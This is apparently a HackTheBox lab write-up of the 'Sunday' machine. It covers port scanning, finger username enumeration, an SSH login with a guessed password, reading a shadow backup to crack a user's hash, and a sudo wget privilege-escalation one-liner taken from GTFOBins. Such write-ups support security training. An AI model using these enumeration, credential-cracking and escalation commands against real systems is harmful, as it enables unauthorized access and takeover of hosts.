---
title: "Sunday"
date: 2023-09-01T16:42:25+02:00
tags: ["privesc","web","linux","ssh"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root."
description: "Linux machine which has a finger port which helps us to list users by bruteforcing. We privEsc to summy thanks to a password leak on a backup file. With a sudoers command we privEsc to root."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Sunday
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Sunday

![Untitled](/HTB/sunday-icon.png)

## Tools Used

- nmap
- finger-user-enum.pl

## Port Scanning

```bash
sudo nmap $IP -n -Pn -vvv --min-rate 5000
```

```bash
PORT      STATE SERVICE  REASON         VERSION
79/tcp    open  finger?  syn-ack ttl 59
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
515/tcp   open  printer  syn-ack ttl 59
6787/tcp  open  ssl/http syn-ack ttl 59 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Issuer: commonName=sunday/organizationName=Host Root CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-08T19:40:00
| Not valid after:  2031-12-06T19:40:00
| MD5:   6bd3:4b32:c05a:e5fe:a8c8:61f0:4361:414a
| SHA-1: a5eb:c880:968c:84aa:10b2:a944:bad2:56ca:aed5:b66a
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM
| SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN
| MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6
| /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8
| YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN
| 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio
| JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/
| WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud
| EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD
| ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr
| Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx
| dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw
| WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb
| qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc
| WPptRhU+2UMGhFXHyGV5EJp2zvc=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
22022/tcp open  ssh      syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94%I=7%D=8/31%Time=64F0B5E8%P=arm-apple-darwin22.4.0%r(G
SF:enericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\
SF:x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20
SF:\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHE
SF:LP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Whe
SF:re\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r
SF:(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x
SF:20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\
SF:x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
```

As we can see, there are 5 open ports. Port **79** is for **finger?**, port **111** is a **rpc**, port **515** is running **printer**, **6787** is a **ssl** port and finally **22022** is a **ssh** port.

## Enumeration

![Untitled](/HTB/sunday-1.png)

Navigating the website we can see a **Oracle Solaris Dashboard** asking for credentials.

As we don’t have any credentials, I tried to fuzz the page without succeed.

So I decide to enumerate other interesting ports.

First I start with **finger?** which is a user information lookup command which gives details of all the users logged in**.**

```bash
nc 10.10.10.76 79
```

Once connected to the port via **nc** I attempted to list the users with the following command:

```bash
@10.10.10.76
```

But the program answers with the next error `Finger forwarding service denied.`

When we try, instead of listing users, to put a valid username like **root** the program gives us info about it  so I decided to try to brute force usernames.

![Untitled](/HTB/sunday-2.png)

## Exploiting

Googling for a finger enumerator exploit I found a **HackTricks** write up which talks about the finger command where we can find a link to a github project called [finger-user-enum](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum) which is an alternative for listing users.

I have executed it with the following command with a **username wordlist** located at **SecLists**.

```bash
./finger-user-enum.pl -U ~/Documents/wordlists/SecLists/Usernames/Names/names.txt -t 10.10.10.76
```

```bash
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            console      <Oct 14, 2022>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
```

Removing all the thrash we have three possible valid usernames **sammy** and **sunny**.

## Gaining an Initial Foothold

Before trying to bruteforce, I attempted common passwords in order to log in and I found one valid combination **sunny/sunday**.

```bash
ssh -p 22022 username@10.10.10.76
```

![Untitled](/HTB/sunday-3.png)

In our home directory there is no flag (we need to **privEsc**) but we can see the `.bash_history` which is not empty

![Untitled](/HTB/sunday-4.png)

```bash
su -
su -
cat /etc/resolv.conf
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll
```

## Escalating Privilege

We can see some commands which may have been executed by **sunny**.

One of them is pretty interesting `sudo /root/troll` if we made **sudo -l** we can see that is the only command we can execute as sudo without password.

![Untitled](/HTB/sunday-5.png)

Once executed shows a **id** output as root but the name makes me think that is only a script printing the root id output.

If we return to the `.bash_history` we can see other command which is consulting a backup.

```bash
cat /backup/shadow.backup
```

```bash
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

The file is **passwd backup file** with two password leaked but hashed so I decided to crack **summy** password with john.

Once cracked we have the next password  `cooldude!`

![Untitled](/HTB/sunday-6.png)

Perfect we are logged as **summy**, let’s check his home directory for a flag.

![Untitled](/HTB/sunday-7.png)

By id we can see that **summy** doesn’t have root permissions, so we need to **privEsc**.

Checking the **sudo** commands with the next command

```bash
sudo -l
```

```bash
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

We can see that we are able to execute **wget** without password as **sudo**. 

In the **GTFOBins** website there is one list of commands which help us to privEsc.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

![Untitled](/HTB/sunday-8.png)

We are **root** 😎

![Untitled](/HTB/sunday-9.png)

**Thank you for reading, and happy hacking! 😄**
